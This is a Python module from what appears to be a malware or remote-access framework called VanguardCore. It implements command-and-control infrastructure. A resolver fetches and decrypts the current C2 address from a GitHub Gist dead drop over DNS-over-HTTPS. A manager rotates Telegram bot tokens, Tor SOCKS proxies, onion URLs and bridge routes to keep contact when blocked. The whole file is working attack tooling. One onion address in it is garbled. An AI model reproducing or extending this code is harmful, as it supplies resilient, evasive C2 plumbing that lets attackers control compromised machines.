from core.resolver import (Resolver, _REQUESTS)
requests = Resolver.get_mod(_REQUESTS)

from core.resolver import (
    Resolver, _OS, _TIME, _THREADING, _REQUESTS, _JSON, _TYPING, _URLLIB_PARSE
)
os = Resolver.get_mod(_OS)
time = Resolver.get_mod(_TIME)
threading = Resolver.get_mod(_THREADING)
requests = Resolver.get_mod(_REQUESTS)
json = Resolver.get_mod(_JSON)
urllib_parse = Resolver.get_mod(_URLLIB_PARSE)
Optional = Resolver.get_mod(_TYPING).Optional
Resolver.load_native()
import VanguardCore

class GistResolver:
    """
    H-11b: C2 discovery via GitHub Gist.
    
    Provides a resilient fallback mechanism for C2 address discovery. 
    It fetches an encrypted payload from a raw GitHub Gist URL, 
    decrypts it locally, and provides the current active C2 address.
    """
    def __init__(self, gist_url: str):
        self.gist_url = gist_url

    def resolve(self) -> Optional[str]:
        """Fetch and decrypt C2 address from Gist (C# optimized)"""
        try:
            # 1. Try C# Native Networking (Stealthy + DoH)
            try:
                import clr
                Resolver.load_native()
                from VanguardCore import NetworkingManager
                # Gist ID is the last part of the URL or we extract it
                gist_id = self.gist_url.split('/')[-1]
                data = NetworkingManager.GetGistData(gist_id, None)
                if data:
                    return data
            except:
                pass

            # 2. Fallback to Python DoH
            from core.dns_resolver import secure_resolver
            url = secure_resolver.get_url_with_ip(self.gist_url)
            host = self.gist_url.split('/')[2]
            
            response = requests.get(url, headers={"Host": host}, timeout=10)
            if response.status_code == 200:
                return Resolver.decrypt(response.text.strip())
        except Exception as e:
            from core.error_logger import log_error
            log_error(f"GistResolver: Failed to resolve C2: {e}")
        return None

class C2Manager:
    """Manages multiple C2 tokens with automatic failover"""

    def __init__(self):
        from core.config import ConfigManager
        
        # H-06: Tokens and infrastructure are now loaded from ConfigManager
        self.tokens = ConfigManager.get("tokens", [
            VanguardCore.SafetyManager.GetSecret("BOT_TOKEN"),
            VanguardCore.SafetyManager.GetSecret("BOT_TOKEN_2"),
            VanguardCore.SafetyManager.GetSecret("BOT_TOKEN_3"),
        ])

        self.bridges = ConfigManager.get("bridges", [])

        self.onion_urls = ConfigManager.get("onion_urls", [
            "https://{seruv;}ime$q{eYMLr0.d-iz", # Example .onion
        ])

        self.proxies = ConfigManager.get("proxies", [
            "socks5h://127.0.0.1:9050", # Standard TOR
            "socks5h://127.0.0.1:9150", # TOR Browser
        ])

        self.failover_chain = ConfigManager.get("failover_chain", [
            ('direct', None),
            ('socks5', '127.0.0.1:9050'),
            ('http', 'proxy.failover.com:8080')
        ])

        self.gist_url = ConfigManager.get("GIST_RESOLVER_URL", VanguardCore.SafetyManager.GetSecret("GIST_URL"))
        self.gist_resolver = GistResolver(self.gist_url) # GistResolver expects RAW URL now
        
        self.current_token_index = 0
        self.current_bridge_index = 0
        self.current_proxy_index = -1 # -1 means no proxy
        self.failed_attempts = 0
        self.max_failures = 3
        self.lock = threading.Lock()

    def get_gist_c2(self) -> Optional[str]:
        """Fetch C2 from Gist as last resort"""
        return self.gist_resolver.resolve()

    def get_current_token(self):
        """Get current active token and apply Gist proxy if blocked"""
        from core.geo_fence import GeoFence
        from core.bridge_manager import bridge_manager
        
        if GeoFence.is_tg_blocked():
            proxy = bridge_manager.get_gist_proxy()
            if proxy:
                log_info(f"C2: Applying P2P Bridge Proxy: {proxy}")
                # Apply globally to requests
                proxies = {
                    "http": f"socks5h://{proxy}",
                    "https": f"socks5h://{proxy}"
                }
                # Note: This is simplified. In a full implementation, 
                # we would use a session or hook into requests.
                self.proxies = [f"socks5h://{proxy}"]
                self.current_proxy_index = 0

        with self.lock:
            tok = self.tokens[self.current_token_index]
            return tok.strip() if isinstance(tok, str) else ""

    def get_proxy(self):
        """Get current proxy if failover is active"""
        with self.lock:
            if self.current_proxy_index == -1: return None
            return self.proxies[self.current_proxy_index % len(self.proxies)]

    def report_failure(self):
        """Report a failure and potentially switch tokens/proxies"""
        with self.lock:
            self.failed_attempts += 1
            if self.failed_attempts >= self.max_failures:
                # If we've failed enough, try enabling proxy
                if self.current_proxy_index == -1:
                    self.current_proxy_index = 0
                    log_info("Enabling SOCKS5 proxy failover", "C2")
                else:
                    self.current_proxy_index += 1
                    self._switch_to_next()
                return True
        return False

    def report_success(self):
        """Reset failure counter and potentially disable proxy"""
        with self.lock:
            self.failed_attempts = 0
            # If we succeed with proxy, we keep it for now. 
            # If we succeed without it, definitely keep it off.

    def _switch_to_next(self):
        """Switch to next available token"""
        self.current_token_index = (self.current_token_index + 1) % len(self.tokens)
        log_info(f"Switched to token index {self.current_token_index}", "C2")
        self.failed_attempts = 0

    def get_api_url(self):
        """Get full API URL with current bridge or onion fallback"""
        with self.lock:
            if self.current_proxy_index != -1 and self.onion_urls:
                return self.onion_urls[0] + "/bot{0}/{1}"

        try:
            from core.bridge_manager import bridge_manager
            route = bridge_manager.get_best_route()
            if route and route.get('api_url'):
                return route['api_url']
        except:
            pass

        bridge = self.get_current_bridge()
        if bridge:
            return bridge + "/bot{0}/{1}"
        return VanguardCore.SafetyManager.GetSecret("TG_API_BASE") + "{0}/{1}"

    def get_file_url(self):
        """Get file URL with current bridge or onion fallback"""
        with self.lock:
            if self.current_proxy_index != -1 and self.onion_urls:
                return self.onion_urls[0] + "/file/bot{0}/{1}"

        try:
            from core.bridge_manager import bridge_manager
            route = bridge_manager.get_best_route()
            if route and route.get('file_url'):
                return route['file_url']
        except:
            pass

        bridge = self.get_current_bridge()
        if bridge:
            return bridge + "/file/bot{0}/{1}"
        return VanguardCore.SafetyManager.GetSecret("TG_FILE_BASE") + "{0}/{1}"

from core.error_logger import log_info, log_error
c2_manager = C2Manager()